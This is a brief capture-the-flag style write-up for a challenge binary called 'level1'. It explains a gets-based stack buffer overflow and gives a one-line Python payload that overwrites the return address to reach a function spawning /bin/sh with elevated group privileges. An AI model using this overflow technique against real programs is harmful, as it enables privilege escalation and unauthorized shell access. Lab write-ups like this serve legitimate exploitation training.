## LEVEL 1 HELP

the level1 binary make a gets call to get user input on a buffer of 76 bytes.

### USAGE

```bash
./level1 [buffer]
```

then we need to overflow the buffer to overwrite the return address of the function to point to the `run` function which will execute `/bin/sh` with the group privileges.

## SOLUTION
To solve this level, you can use the following python command to create the payload and run the binary:

```bash
./level1 << EOF 
$(python3 -c 'print("A"*76 + "\x44\x84\x04\x08")')
EOF
```